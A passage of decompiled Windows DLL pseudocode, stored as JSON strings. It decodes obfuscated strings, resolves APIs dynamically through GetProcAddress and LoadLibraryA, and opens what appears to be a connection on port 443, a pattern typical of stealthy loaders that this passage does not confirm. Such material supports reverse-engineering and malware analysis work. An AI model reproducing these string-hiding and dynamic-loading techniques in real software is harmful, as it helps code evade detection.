    "          v13 = (void *)*((_DWORD *)v23[0] - 1);",
    "          if ( (unsigned int)((char *)v23[0] - (char *)v13 - 4) > 0x1F )",
    "            goto LABEL_42;",
    "        }",
    "        sub_100154EB(v13);",
    "      }",
    "    }",
    "  }",
    "  if ( HIDWORD(a3) > 7 )",
    "  {",
    "    v16 = (void *)Block;",
    "    if ( (unsigned int)(2 * HIDWORD(a3) + 2) >= 0x1000 )",
    "    {",
    "      v16 = *(void **)(Block - 4);",
    "      if ( (unsigned int)(Block - (_DWORD)v16 - 4) > 0x1F )",
    "LABEL_42:",
    "        _invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_100154EB(v16);",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "char __thiscall sub_10011D60(",
    "        _DWORD **this,",
    "        int a2,",
    "        int a3,",
    "        void *a4,",
    "        HMODULE a5,",
    "        void *a6,",
    "        _BYTE *a7,",
    "        double *a8,",
    "        HMODULE a9)",
    "{",
    "  _DWORD *v10; // eax",
    "  _DWORD *v11; // eax",
    "  _DWORD *v12; // eax",
    "  const WCHAR *v13; // eax",
    "  HMODULE ModuleHandleW; // eax",
    "  const CHAR *v15; // eax",
    "  _DWORD *v16; // eax",
    "  _DWORD *v17; // eax",
    "  void (__cdecl *v18)(_DWORD, _BYTE *, int *); // eax",
    "  _DWORD *v19; // eax",
    "  const CHAR *v20; // eax",
    "  _DWORD *v21; // eax",
    "  _DWORD *v22; // eax",
    "  int (__cdecl *v23)(_BYTE *, _DWORD, _DWORD, _DWORD, _DWORD); // eax",
    "  _DWORD *v24; // eax",
    "  _DWORD *v25; // ecx",
    "  _DWORD *v26; // eax",
    "  int (__cdecl *v27)(_DWORD **, int, int, _DWORD, _DWORD, int, _DWORD, _DWORD); // eax",
    "  void **v28; // eax",
    "  void **v29; // eax",
    "  int (__cdecl *v30)(int, HMODULE, void *, _DWORD, _DWORD, _DWORD, int, _DWORD); // eax",
    "  int v31; // eax",
    "  _DWORD *v32; // ecx",
    "  void **v33; // eax",
    "  void (__cdecl *v34)(_DWORD **, int, int *, int); // eax",
    "  unsigned int v35; // edi",
    "  void **v36; // eax",
    "  void (__cdecl *v37)(_DWORD **, HMODULE, int, HANDLE, unsigned int); // eax",
    "  _DWORD **v38; // esi",
    "  void **v39; // eax",
    "  void **v40; // ecx",
    "  size_t v41; // edi",
    "  char *v42; // edx",
    "  void **v43; // eax",
    "  char *v44; // esi",
    "  void **v45; // eax",
    "  void *v46; // edx",
    "  const CHAR *v47; // ecx",
    "  _DWORD *v48; // edi",
    "  const WCHAR *v49; // ecx",
    "  const CHAR *v50; // eax",
    "  HMODULE v51; // eax",
    "  FARPROC v52; // eax",
    "  const CHAR *v53; // ecx",
    "  HMODULE v54; // edi",
    "  void *v55; // edx",
    "  const CHAR *v56; // ecx",
    "  CHAR *v57; // edx",
    "  const CHAR *v58; // ecx",
    "  WCHAR *v59; // edx",
    "  const CHAR *v60; // ecx",
    "  CHAR *v61; // edx",
    "  const CHAR *v62; // ecx",
    "  void *v63; // edx",
    "  const CHAR *v64; // ecx",
    "  void *v65; // edx",
    "  const CHAR *v66; // ecx",
    "  void *v67; // edx",
    "  const CHAR *v68; // ecx",
    "  void *v69; // edx",
    "  const CHAR *v70; // ecx",
    "  void *v71; // edx",
    "  const CHAR *v72; // ecx",
    "  void *v73; // edx",
    "  const CHAR *v74; // ecx",
    "  void *v75; // edx",
    "  const CHAR *v76; // ecx",
    "  void *v77; // edx",
    "  const CHAR *v78; // ecx",
    "  void *v79; // edx",
    "  const CHAR *v80; // ecx",
    "  void *v81; // edx",
    "  const CHAR *v82; // ecx",
    "  void *v83; // edx",
    "  const CHAR *v84; // ecx",
    "  void *v85; // edx",
    "  const CHAR *v86; // ecx",
    "  void *v87; // edx",
    "  const CHAR *v88; // ecx",
    "  void *v89; // edx",
    "  const CHAR *v90; // ecx",
    "  void *v91; // edx",
    "  const CHAR *v92; // ecx",
    "  void *v93; // edx",
    "  const CHAR *v94; // ecx",
    "  void *v95; // edx",
    "  const CHAR *v96; // ecx",
    "  void **v97; // eax",
    "  int (__cdecl *v98)(_DWORD *); // esi",
    "  _DWORD *v99; // eax",
    "  _DWORD **v100; // edi",
    "  HMODULE v101; // esi",
    "  void **v102; // eax",
    "  int (__stdcall *v103)(); // edi",
    "  void *v104; // edx",
    "  const wchar_t *v105; // ecx",
    "  void *v106; // edx",
    "  const wchar_t *v107; // ecx",
    "  void *v108; // edx",
    "  const wchar_t *v109; // ecx",
    "  void *v110; // edx",
    "  const wchar_t *v111; // ecx",
    "  void **v113; // ecx",
    "  void **v114; // edx",
    "  void **v115; // eax",
    "  void **v116; // edx",
    "  const wchar_t *v117; // eax",
    "  void *v118; // esi",
    "  int v119; // ecx",
    "  void **v120; // esi",
    "  _DWORD *v121; // edi",
    "  int v122; // eax",
    "  double v123; // xmm0_8",
    "  _BYTE *v124; // edi",
    "  void *v125; // eax",
    "  int v126; // edx",
    "  const wchar_t *v127; // ecx",
    "  int v128; // edi",
    "  void *v129; // edx",
    "  const wchar_t *v130; // ecx",
    "  void *v131; // esi",
    "  unsigned int v132; // ecx",
    "  WCHAR *v133; // edx",
    "  const wchar_t *v134; // ecx",
    "  void *v135; // edx",
    "  const wchar_t *v136; // ecx",
    "  _DWORD *v137; // edi",
    "  const WCHAR *v138; // ecx",
    "  LPCSTR *v139; // eax",
    "  HMODULE v140; // eax",
    "  FARPROC v141; // eax",
    "  const CHAR *v142; // ecx",
    "  _DWORD **v143; // edi",
    "  HMODULE v144; // esi",
    "  void **v145; // eax",
    "  void (__cdecl *v146)(HANDLE, char *, unsigned int, CHAR ***, _DWORD); // eax",
    "  void *v147; // edx",
    "  unsigned int v148; // ecx",
    "  void *v149; // edx",
    "  unsigned int v150; // ecx",
    "  CHAR *v151; // edx",
    "  unsigned int v152; // ecx",
    "  WCHAR *v153; // edx",
    "  unsigned int v154; // ecx",
    "  CHAR *v155; // edx",
    "  unsigned int v156; // ecx",
    "  void *v157; // edx",
    "  _DWORD *v158; // ecx",
    "  void *v159; // edx",
    "  _DWORD *v160; // ecx",
    "  void *v161; // edx",
    "  _DWORD *v162; // ecx",
    "  void *v163; // edx",
    "  _DWORD *v164; // ecx",
    "  void *v165; // edx",
    "  _DWORD *v166; // ecx",
    "  void *v167; // edx",
    "  _DWORD *v168; // ecx",
    "  void *v169; // edx",
    "  _DWORD *v170; // ecx",
    "  void *v171; // edx",
    "  _DWORD *v172; // ecx",
    "  void *v173; // edx",
    "  _DWORD *v174; // ecx",
    "  void *v175; // edx",
    "  _DWORD *v176; // ecx",
    "  void *v177; // edx",
    "  _DWORD *v178; // ecx",
    "  void *v179; // edx",
    "  _DWORD *v180; // ecx",
    "  void *v181; // edx",
    "  _DWORD *v182; // ecx",
    "  void *v183; // edx",
    "  _DWORD *v184; // ecx",
    "  void *v185; // edx",
    "  int v186; // ecx",
    "  void *v187; // edx",
    "  int v188; // ecx",
    "  void *v189; // edx",
    "  int v190; // ecx",
    "  void *v191; // edx",
    "  int v192; // ecx",
    "  void *v193; // edx",
    "  int v194; // ecx",
    "  void *v195; // edx",
    "  int v196; // ecx",
    "  void *v197; // edx",
    "  int v198; // ecx",
    "  void *v199; // edx",
    "  int v200; // ecx",
    "  void *v201; // edx",
    "  int v202; // ecx",
    "  void *v203; // edx",
    "  unsigned int v204; // ecx",
    "  _DWORD *v205; // [esp-24h] [ebp-1660h] BYREF",
    "  int v206; // [esp-20h] [ebp-165Ch]",
    "  int v207; // [esp-1Ch] [ebp-1658h]",
    "  int v208; // [esp-18h] [ebp-1654h]",
    "  unsigned int v209; // [esp-14h] [ebp-1650h]",
    "  __int128 v210; // [esp-10h] [ebp-164Ch] BYREF",
    "  unsigned __int64 v211; // [esp+0h] [ebp-163Ch] BYREF",
    "  int v212; // [esp+8h] [ebp-1634h]",
    "  _DWORD *v213; // [esp+Ch] [ebp-1630h] BYREF",
    "  unsigned int v214; // [esp+10h] [ebp-162Ch]",
    "  unsigned int v215; // [esp+14h] [ebp-1628h]",
    "  _DWORD *v216; // [esp+18h] [ebp-1624h] BYREF",
    "  int v217; // [esp+1Ch] [ebp-1620h]",
    "  unsigned int v218; // [esp+20h] [ebp-161Ch]",
    "  int v219; // [esp+24h] [ebp-1618h]",
    "  int v220; // [esp+28h] [ebp-1614h]",
    "  unsigned int v221; // [esp+2Ch] [ebp-1610h]",
    "  CHAR *v222; // [esp+30h] [ebp-160Ch] BYREF",
    "  int v223; // [esp+34h] [ebp-1608h] BYREF",
    "  int v224; // [esp+38h] [ebp-1604h]",
    "  HANDLE v225; // [esp+3Ch] [ebp-1600h]",
    "  void **v226; // [esp+40h] [ebp-15FCh]",
    "  signed int v227; // [esp+44h] [ebp-15F8h]",
    "  unsigned int v228; // [esp+48h] [ebp-15F4h]",
    "  _DWORD *v229; // [esp+4Ch] [ebp-15F0h] BYREF",
    "  int v230; // [esp+50h] [ebp-15ECh]",
    "  int v231; // [esp+54h] [ebp-15E8h]",
    "  int v232; // [esp+58h] [ebp-15E4h]",
    "  unsigned int v233; // [esp+5Ch] [ebp-15E0h]",
    "  unsigned int v234; // [esp+60h] [ebp-15DCh]",
    "  _DWORD *v235[4]; // [esp+64h] [ebp-15D8h] BYREF",
    "  _DWORD *v236; // [esp+74h] [ebp-15C8h] BYREF",
    "  unsigned int v237; // [esp+78h] [ebp-15C4h]",
    "  int v238; // [esp+7Ch] [ebp-15C0h]",
    "  int v239; // [esp+80h] [ebp-15BCh]",
    "  unsigned int v240; // [esp+84h] [ebp-15B8h]",
    "  unsigned int v241; // [esp+88h] [ebp-15B4h]",
    "  _DWORD *v242[3]; // [esp+8Ch] [ebp-15B0h] BYREF",
    "  int v243; // [esp+98h] [ebp-15A4h]",
    "  _DWORD *v244; // [esp+9Ch] [ebp-15A0h] BYREF",
    "  unsigned int v245; // [esp+A0h] [ebp-159Ch]",
    "  int v246; // [esp+A4h] [ebp-1598h]",
    "  int v247; // [esp+A8h] [ebp-1594h]",
    "  unsigned int v248; // [esp+ACh] [ebp-1590h]",
    "  unsigned int v249; // [esp+B0h] [ebp-158Ch]",
    "  _DWORD *v250; // [esp+B4h] [ebp-1588h] BYREF",
    "  _DWORD *v251; // [esp+B8h] [ebp-1584h] BYREF",
    "  int v252; // [esp+BCh] [ebp-1580h]",
    "  int v253; // [esp+C0h] [ebp-157Ch]",
    "  int v254; // [esp+C4h] [ebp-1578h]",
    "  unsigned int v255; // [esp+C8h] [ebp-1574h]",
    "  _DWORD *v256; // [esp+CCh] [ebp-1570h] BYREF",
    "  _DWORD *v257; // [esp+D0h] [ebp-156Ch] BYREF",
    "  int v258; // [esp+D4h] [ebp-1568h]",
    "  int v259; // [esp+D8h] [ebp-1564h]",
    "  unsigned int v260; // [esp+DCh] [ebp-1560h]",
    "  unsigned int v261; // [esp+E0h] [ebp-155Ch]",
    "  CHAR *v262; // [esp+E4h] [ebp-1558h] BYREF",
    "  int v263; // [esp+E8h] [ebp-1554h]",
    "  int v264; // [esp+ECh] [ebp-1550h]",
    "  int v265; // [esp+F0h] [ebp-154Ch]",
    "  int v266; // [esp+F4h] [ebp-1548h]",
    "  LPCSTR v267; // [esp+F8h] [ebp-1544h]",
    "  _DWORD v268[5]; // [esp+FCh] [ebp-1540h] BYREF",
    "  _BYTE *v269; // [esp+110h] [ebp-152Ch]",
    "  HMODULE LibraryA; // [esp+114h] [ebp-1528h]",
    "  double *v271; // [esp+118h] [ebp-1524h]",
    "  HMODULE v272; // [esp+11Ch] [ebp-1520h]",
    "  _DWORD **v273; // [esp+120h] [ebp-151Ch]",
    "  HANDLE hObject; // [esp+124h] [ebp-1518h]",
    "  _DWORD **v275; // [esp+128h] [ebp-1514h]",
    "  int v276; // [esp+12Ch] [ebp-1510h]",
    "  void *v277; // [esp+130h] [ebp-150Ch]",
    "  HMODULE hLibModule; // [esp+134h] [ebp-1508h]",
    "  FARPROC ProcAddress; // [esp+138h] [ebp-1504h]",
    "  LPCCH lpMultiByteStr; // [esp+13Ch] [ebp-1500h]",
    "  _DWORD **v281; // [esp+140h] [ebp-14FCh]",
    "  HMODULE v282; // [esp+144h] [ebp-14F8h] BYREF",
    "  void *v283[5]; // [esp+148h] [ebp-14F4h] BYREF",
    "  unsigned int v284; // [esp+15Ch] [ebp-14E0h]",
    "  void *v285[5]; // [esp+160h] [ebp-14DCh] BYREF",
    "  unsigned int v286; // [esp+174h] [ebp-14C8h]",
    "  LPCSTR v287[5]; // [esp+178h] [ebp-14C4h] BYREF",
    "  unsigned int v288; // [esp+18Ch] [ebp-14B0h]",
    "  void *v289[5]; // [esp+190h] [ebp-14ACh] BYREF",
    "  unsigned int v290; // [esp+1A4h] [ebp-1498h]",
    "  LPCSTR v291[5]; // [esp+1A8h] [ebp-1494h] BYREF",
    "  unsigned int v292; // [esp+1BCh] [ebp-1480h]",
    "  LPCWSTR lpModuleName[5]; // [esp+1C0h] [ebp-147Ch] BYREF",
    "  unsigned int v294; // [esp+1D4h] [ebp-1468h]",
    "  LPCSTR lpProcName[5]; // [esp+1D8h] [ebp-1464h] BYREF",
    "  unsigned int v296; // [esp+1ECh] [ebp-1450h]",
    "  void *v297[5]; // [esp+1F0h] [ebp-144Ch] BYREF",
    "  unsigned int v298; // [esp+204h] [ebp-1438h]",
    "  void *v299[4]; // [esp+208h] [ebp-1434h] BYREF",
    "  size_t v300; // [esp+218h] [ebp-1424h]",
    "  unsigned int v301; // [esp+21Ch] [ebp-1420h]",
    "  void *v302[4]; // [esp+220h] [ebp-141Ch] BYREF",
    "  int v303; // [esp+230h] [ebp-140Ch]",
    "  unsigned int v304; // [esp+234h] [ebp-1408h]",
    "  void *Src[4]; // [esp+238h] [ebp-1404h] BYREF",
    "  size_t Size; // [esp+248h] [ebp-13F4h]",
    "  unsigned int v307; // [esp+24Ch] [ebp-13F0h]",
    "  LPCSTR lpLibFileName[5]; // [esp+250h] [ebp-13ECh] BYREF",
    "  unsigned int v309; // [esp+264h] [ebp-13D8h]",
    "  void *v310[4]; // [esp+268h] [ebp-13D4h] BYREF",
    "  __int64 v311; // [esp+278h] [ebp-13C4h]",
    "  void *v312[4]; // [esp+280h] [ebp-13BCh] BYREF",
    "  int v313; // [esp+290h] [ebp-13ACh]",
    "  unsigned int v314; // [esp+294h] [ebp-13A8h]",
    "  unsigned int v315; // [esp+298h] [ebp-13A4h] BYREF",
    "  int v316; // [esp+29Ch] [ebp-13A0h] BYREF",
    "  void *v317[5]; // [esp+2A0h] [ebp-139Ch] BYREF",
    "  unsigned int v318; // [esp+2B4h] [ebp-1388h]",
    "  LPCWSTR v319[4]; // [esp+2B8h] [ebp-1384h] BYREF",
    "  int v320; // [esp+2C8h] [ebp-1374h]",
    "  unsigned int v321; // [esp+2CCh] [ebp-1370h]",
    "  void *v322[4]; // [esp+2D0h] [ebp-136Ch] BYREF",
    "  int v323; // [esp+2E0h] [ebp-135Ch]",
    "  unsigned int v324; // [esp+2E4h] [ebp-1358h]",
    "  void *Block[3]; // [esp+2E8h] [ebp-1354h] BYREF",
    "  void *v326[2]; // [esp+2F4h] [ebp-1348h] BYREF",
    "  unsigned int v327; // [esp+2FCh] [ebp-1340h]",
    "  void *v328[4]; // [esp+300h] [ebp-133Ch] BYREF",
    "  int v329; // [esp+310h] [ebp-132Ch]",
    "  unsigned int v330; // [esp+314h] [ebp-1328h]",
    "  void *v331[4]; // [esp+318h] [ebp-1324h] BYREF",
    "  int v332; // [esp+328h] [ebp-1314h]",
    "  unsigned int v333; // [esp+32Ch] [ebp-1310h]",
    "  void *v334[4]; // [esp+330h] [ebp-130Ch] BYREF",
    "  int v335; // [esp+340h] [ebp-12FCh]",
    "  unsigned int v336; // [esp+344h] [ebp-12F8h]",
    "  void *v337[4]; // [esp+348h] [ebp-12F4h] BYREF",
    "  int v338; // [esp+358h] [ebp-12E4h]",
    "  unsigned int v339; // [esp+35Ch] [ebp-12E0h]",
    "  void *v340[4]; // [esp+360h] [ebp-12DCh] BYREF",
    "  int v341; // [esp+370h] [ebp-12CCh]",
    "  unsigned int v342; // [esp+374h] [ebp-12C8h]",
    "  void *v343[4]; // [esp+378h] [ebp-12C4h] BYREF",
    "  int v344; // [esp+388h] [ebp-12B4h]",
    "  unsigned int v345; // [esp+38Ch] [ebp-12B0h]",
    "  void *v346[4]; // [esp+390h] [ebp-12ACh] BYREF",
    "  int v347; // [esp+3A0h] [ebp-129Ch]",
    "  unsigned int v348; // [esp+3A4h] [ebp-1298h]",
    "  void *v349[4]; // [esp+3A8h] [ebp-1294h] BYREF",
    "  int v350; // [esp+3B8h] [ebp-1284h]",
    "  unsigned int v351; // [esp+3BCh] [ebp-1280h]",
    "  void *v352[4]; // [esp+3C0h] [ebp-127Ch] BYREF",
    "  int v353; // [esp+3D0h] [ebp-126Ch]",
    "  unsigned int v354; // [esp+3D4h] [ebp-1268h]",
    "  void *v355[4]; // [esp+3D8h] [ebp-1264h] BYREF",
    "  int v356; // [esp+3E8h] [ebp-1254h]",
    "  unsigned int v357; // [esp+3ECh] [ebp-1250h]",
    "  void *v358[4]; // [esp+3F0h] [ebp-124Ch] BYREF",
    "  int v359; // [esp+400h] [ebp-123Ch]",
    "  unsigned int v360; // [esp+404h] [ebp-1238h]",
    "  void *v361[4]; // [esp+408h] [ebp-1234h] BYREF",
    "  int v362; // [esp+418h] [ebp-1224h]",
    "  unsigned int v363; // [esp+41Ch] [ebp-1220h]",
    "  CHAR **v364; // [esp+420h] [ebp-121Ch] BYREF",
    "  int v365; // [esp+424h] [ebp-1218h] BYREF",
    "  char cbMultiByte[4096]; // [esp+428h] [ebp-1214h] BYREF",
    "  _BYTE v367[512]; // [esp+1428h] [ebp-214h] BYREF",
    "  _DWORD *v368; // [esp+162Ch] [ebp-10h]",
    "  int v369; // [esp+1638h] [ebp-4h]",
    "",
    "  v368 = v268;",
    "  v275 = this;",
    "  v276 = a3;",
    "  v277 = a4;",
    "  v269 = a7;",
    "  v271 = a8;",
    "  v272 = a5;",
    "  v282 = a9;",
    "  hObject = a6;",
    "  v268[4] = this;",
    "  v316 = 512;",
    "  sub_10001880(&v262, v367);",
    "  sub_1000AA30((int)v317, v262, v263, v264, v265, v266, (unsigned int)v267);",
    "  v369 = 0;",
    "  v364 = &v262;",
    "  sub_10009E70(&v256, *this);",
    "  sub_1000B000(&v262, v256, (int)v257, v258, v259, v260, v261);",
    "  LOBYTE(v369) = 1;",
    "  sub_10009E70(&v256, *this + 186);",
    "  LOBYTE(v369) = 0;",
    "  sub_1000B970(v355, v256, (int)v257, v258, v259, v260, v261, v262, v263, v264, v265, v266, (unsigned int)v267);",
    "  LOBYTE(v369) = 2;",
    "  sub_10009E70(&v262, v355);",
    "  sub_1000AA30((int)v346, v262, v263, v264, v265, v266, (unsigned int)v267);",
    "  LOBYTE(v369) = 3;",
    "  v10 = *this;",
    "  v364 = &v262;",
    "  sub_10009E70(&v256, v10 + 6);",
    "  sub_1000B000(&v262, v256, (int)v257, v258, v259, v260, v261);",
    "  LOBYTE(v369) = 4;",
    "  sub_10009E70(&v256, *this + 192);",
    "  LOBYTE(v369) = 3;",
    "  sub_1000B970(v349, v256, (int)v257, v258, v259, v260, v261, v262, v263, v264, v265, v266, (unsigned int)v267);",
    "  LOBYTE(v369) = 5;",
    "  v11 = *this;",
    "  v364 = &v262;",
    "  sub_10009E70(&v256, v11 + 54);",
    "  sub_1000B000(&v262, v256, (int)v257, v258, v259, v260, v261);",
    "  LOBYTE(v369) = 6;",
    "  sub_10009E70(&v256, *this + 240);",
    "  LOBYTE(v369) = 5;",
    "  sub_1000B970(v340, v256, (int)v257, v258, v259, v260, v261, v262, v263, v264, v265, v266, (unsigned int)v267);",
    "  LOBYTE(v369) = 7;",
    "  v12 = *this;",
    "  v364 = &v262;",
    "  sub_10009E70(&v256, v12 + 114);",
    "  sub_1000B000(&v262, v256, (int)v257, v258, v259, v260, v261);",
    "  LOBYTE(v369) = 8;",
    "  sub_10009E70(&v256, *this + 396);",
    "  LOBYTE(v369) = 7;",
    "  sub_1000B970(v352, v256, (int)v257, v258, v259, v260, v261, v262, v263, v264, v265, v266, (unsigned int)v267);",
    "  LOBYTE(v369) = 9;",
    "  v267 = (LPCSTR)sub_10003490(v349);",
    "  v13 = (const WCHAR *)sub_10009D00(v346);",
    "  ModuleHandleW = GetModuleHandleW(v13);",
    "  ProcAddress = GetProcAddress(ModuleHandleW, v267);",
    "  v15 = (const CHAR *)sub_10003490(v352);",
    "  LibraryA = LoadLibraryA(v15);",
    "  if ( !LibraryA )",
    "    goto LABEL_153;",
    "  v16 = *this;",
    "  v364 = &v262;",
    "  sub_10009E70(&v256, v16 + 126);",
    "  sub_1000B000(&v262, v256, (int)v257, v258, v259, v260, v261);",
    "  LOBYTE(v369) = 10;",
    "  sub_10009E70(&v256, *this + 408);",
    "  LOBYTE(v369) = 9;",
    "  sub_1000B970(v289, v256, (int)v257, v258, v259, v260, v261, v262, v263, v264, v265, v266, (unsigned int)v267);",
    "  LOBYTE(v369) = 11;",
    "  v17 = sub_10003490(v289);",
    "  v18 = (void (__cdecl *)(_DWORD, _BYTE *, int *))((int (__cdecl *)(HMODULE, _DWORD *))ProcAddress)(LibraryA, v17);",
    "  if ( v18 )",
    "    v18(0, v367, &v316);",
    "  LOBYTE(v369) = 9;",
    "  sub_100017E0(v289);",
    "  v19 = *this;",
    "  v364 = (CHAR **)&v257;",
    "  sub_10009E70(&v251, v19 + 30);",
    "  sub_1000B000(&v257, v251, v252, v253, v254, v255, (unsigned int)v256);",
    "  LOBYTE(v369) = 12;",
    "  sub_10009E70(&v251, *this + 402);",
    "  LOBYTE(v369) = 9;",
    "  sub_1000B970(v343, v251, v252, v253, v254, v255, (unsigned int)v256, v257, v258, v259, v260, v261, (unsigned int)v262);",
    "  LOBYTE(v369) = 13;",
    "  v20 = (const CHAR *)sub_10003490(v343);",
    "  hLibModule = LoadLibraryA(v20);",
    "  if ( !hLibModule )",
    "    goto LABEL_158;",
    "  v21 = *this;",
    "  v273 = &v257;",
    "  sub_10009E70(&v251, v21 + 84);",
    "  sub_1000B000(&v257, v251, v252, v253, v254, v255, (unsigned int)v256);",
    "  LOBYTE(v369) = 14;",
    "  sub_10009E70(&v251, *this + 414);",
    "  LOBYTE(v369) = 13;",
    "  sub_1000B970(v337, v251, v252, v253, v254, v255, (unsigned int)v256, v257, v258, v259, v260, v261, (unsigned int)v262);",
    "  LOBYTE(v369) = 15;",
    "  v22 = sub_10003490(v337);",
    "  v23 = (int (__cdecl *)(_BYTE *, _DWORD, _DWORD, _DWORD, _DWORD))((int (__cdecl *)(HMODULE, _DWORD *))ProcAddress)(",
    "                                                                    hLibModule,",
    "                                                                    v22);",
    "  if ( !v23 )",
    "    goto LABEL_157;",
    "  v273 = (_DWORD **)v23(v367, 0, 0, 0, 0);",
    "  sub_10001880(v334, (void *)v276);",
    "  LOBYTE(v369) = 16;",
    "  v24 = sub_10003490(v334);",
    "  v25 = *this;",
    "  v281 = &v250;",
    "  v276 = (int)v24;",
    "  sub_10009E70(&v244, v25 + 150);",
    "  sub_1000B000(&v250, v244, v245, v246, v247, v248, v249);",
    "  LOBYTE(v369) = 17;",
    "  sub_10009E70(&v244, *this + 420);",
    "  LOBYTE(v369) = 16;",
    "  sub_1000B970(v331, v244, v245, v246, v247, v248, v249, v250, (int)v251, v252, v253, v254, v255);",
    "  LOBYTE(v369) = 18;",
    "  v26 = sub_10003490(v331);",
    "  v27 = (int (__cdecl *)(_DWORD **, int, int, _DWORD, _DWORD, int, _DWORD, _DWORD))((int (__cdecl *)(HMODULE, _DWORD *))ProcAddress)(",
    "                                                                                     hLibModule,",
    "                                                                                     v26);",
    "  if ( !v27 )",
    "    goto LABEL_156;",
    "  v276 = v27(v273, v276, 443, 0, 0, 3, 0, 0);",
    "  *(_OWORD *)v358 = 0;",
    "  v359 = 0;",
    "  v360 = 0;",
    "  sub_100018C0(v358, v277, strlen((const char *)v277));",
    "  LOBYTE(v369) = 19;",
    "  v28 = v358;",
    "  if ( v360 > 0xF )",
    "    v28 = (void **)v358[0];",
    "  lpMultiByteStr = (LPCCH)v242;",
    "  v277 = v28;",
    "  sub_10009E70(&v236, *this + 132);",
    "  sub_1000B000(v242, v236, v237, v238, v239, v240, v241);",
    "  LOBYTE(v369) = 20;",
    "  sub_10009E70(&v236, *this + 426);",
    "  LOBYTE(v369) = 19;",
    "  sub_1000B970(v361, v236, v237, v238, v239, v240, v241, v242[0], (int)v242[1], (int)v242[2], v243, (int)v244, v245);",
    "  LOBYTE(v369) = 21;",
    "  v29 = v361;",
    "  if ( v363 > 0xF )",
    "    v29 = (void **)v361[0];",
    "  v30 = (int (__cdecl *)(int, HMODULE, void *, _DWORD, _DWORD, _DWORD, int, _DWORD))((int (__cdecl *)(HMODULE, void **))ProcAddress)(",
    "                                                                                      hLibModule,",
    "                                                                                      v29);",
    "  if ( !v30 )",
    "  {",
    "    if ( v363 > 0xF )",
    "    {",
    "      v185 = v361[0];",
    "      v186 = v363 + 1;",
    "      if ( v363 + 1 >= 0x1000 )",
    "      {",
    "        v185 = (void *)*((_DWORD *)v361[0] - 1);",
    "        v186 = v363 + 36;",
    "        if ( (unsigned int)((char *)v361[0] - (char *)v185 - 4) > 0x1F )",
    "          goto LABEL_346;",
    "      }",
    "      v243 = v186;",
    "      sub_100154EB(v185);",
    "    }",
    "    v362 = 0;",
    "    v363 = 15;",
    "    LOBYTE(v361[0]) = 0;",
    "    if ( v360 > 0xF )",
    "    {",
    "      v187 = v358[0];",
    "      v188 = v360 + 1;",
    "      if ( v360 + 1 >= 0x1000 )",
    "      {",
    "        v187 = (void *)*((_DWORD *)v358[0] - 1);",
    "        v188 = v360 + 36;",
    "        if ( (unsigned int)((char *)v358[0] - (char *)v187 - 4) > 0x1F )",
    "          goto LABEL_346;",
    "      }",
    "      v243 = v188;",
    "      sub_100154EB(v187);",
    "    }",
    "    v359 = 0;",
    "    v360 = 15;",
    "    LOBYTE(v358[0]) = 0;",
    "    if ( v333 > 0xF )",
    "    {",
    "      v189 = v331[0];",
    "      v190 = v333 + 1;",
    "      if ( v333 + 1 >= 0x1000 )",
    "      {",
    "        v189 = (void *)*((_DWORD *)v331[0] - 1);",
    "        v190 = v333 + 36;",
    "        if ( (unsigned int)((char *)v331[0] - (char *)v189 - 4) > 0x1F )",
    "          goto LABEL_346;",
    "      }",
    "      v243 = v190;",
    "      sub_100154EB(v189);",
    "    }",
    "    v332 = 0;",
    "    v333 = 15;",
    "    LOBYTE(v331[0]) = 0;",
    "    if ( v336 > 0xF )",
    "    {",
    "      v191 = v334[0];",
    "      v192 = v336 + 1;",
    "      if ( v336 + 1 >= 0x1000 )",
    "      {",
    "        v191 = (void *)*((_DWORD *)v334[0] - 1);",
    "        v192 = v336 + 36;",
    "        if ( (unsigned int)((char *)v334[0] - (char *)v191 - 4) > 0x1F )",
    "          goto LABEL_346;",
    "      }",
    "      v243 = v192;",
    "      sub_100154EB(v191);",
    "    }",
    "    v335 = 0;",
    "    v336 = 15;",
    "    LOBYTE(v334[0]) = 0;",
    "    if ( v339 > 0xF )",
    "    {",
    "      v193 = v337[0];",
    "      v194 = v339 + 1;",
    "      if ( v339 + 1 >= 0x1000 )",
    "      {",
    "        v193 = (void *)*((_DWORD *)v337[0] - 1);",
    "        v194 = v339 + 36;",
    "        if ( (unsigned int)((char *)v337[0] - (char *)v193 - 4) > 0x1F )",
    "          goto LABEL_346;",
    "      }",
    "      v243 = v194;",
    "      sub_100154EB(v193);",
    "    }",
    "    v338 = 0;",
    "    v339 = 15;",
    "    LOBYTE(v337[0]) = 0;",
    "    if ( v345 > 0xF )",
    "    {",
    "      v195 = v343[0];",
    "      v196 = v345 + 1;",
    "      if ( v345 + 1 >= 0x1000 )",
    "      {",
    "        v195 = (void *)*((_DWORD *)v343[0] - 1);",
    "        v196 = v345 + 36;",
    "        if ( (unsigned int)((char *)v343[0] - (char *)v195 - 4) > 0x1F )",
    "          goto LABEL_346;",
    "      }",
    "      v243 = v196;",
    "      sub_100154EB(v195);",
    "    }",
    "    v344 = 0;",
    "    v345 = 15;",
    "    LOBYTE(v343[0]) = 0;",
    "    if ( v354 > 0xF )",
    "    {",
    "      v197 = v352[0];",
    "      v198 = v354 + 1;",
    "      if ( v354 + 1 >= 0x1000 )",
    "      {",
    "        v197 = (void *)*((_DWORD *)v352[0] - 1);",
    "        v198 = v354 + 36;",
    "        if ( (unsigned int)((char *)v352[0] - (char *)v197 - 4) > 0x1F )",
    "          goto LABEL_346;",
    "      }",
    "      v243 = v198;",
    "      sub_100154EB(v197);",
    "    }",
    "    v353 = 0;",
    "    v354 = 15;",
    "    LOBYTE(v352[0]) = 0;",
    "    if ( v342 > 0xF )",
    "    {",
    "      v199 = v340[0];",
    "      v200 = v342 + 1;",
    "      if ( v342 + 1 >= 0x1000 )",
    "      {",
    "        v199 = (void *)*((_DWORD *)v340[0] - 1);",
    "        v200 = v342 + 36;",
    "        if ( (unsigned int)((char *)v340[0] - (char *)v199 - 4) > 0x1F )",
    "          goto LABEL_346;",
    "      }",
    "      v243 = v200;",
    "      sub_100154EB(v199);",
    "    }",
    "    v341 = 0;",
    "    v342 = 15;",
    "    LOBYTE(v340[0]) = 0;",
    "    if ( v351 > 0xF )",
    "    {",
    "      v201 = v349[0];",
    "      v202 = v351 + 1;",
    "      if ( v351 + 1 >= 0x1000 )",
    "      {",
    "        v201 = (void *)*((_DWORD *)v349[0] - 1);",
    "        v202 = v351 + 36;",
    "        if ( (unsigned int)((char *)v349[0] - (char *)v201 - 4) > 0x1F )",
    "          goto LABEL_346;",
    "      }",
    "      v243 = v202;",
    "      sub_100154EB(v201);",
    "    }",
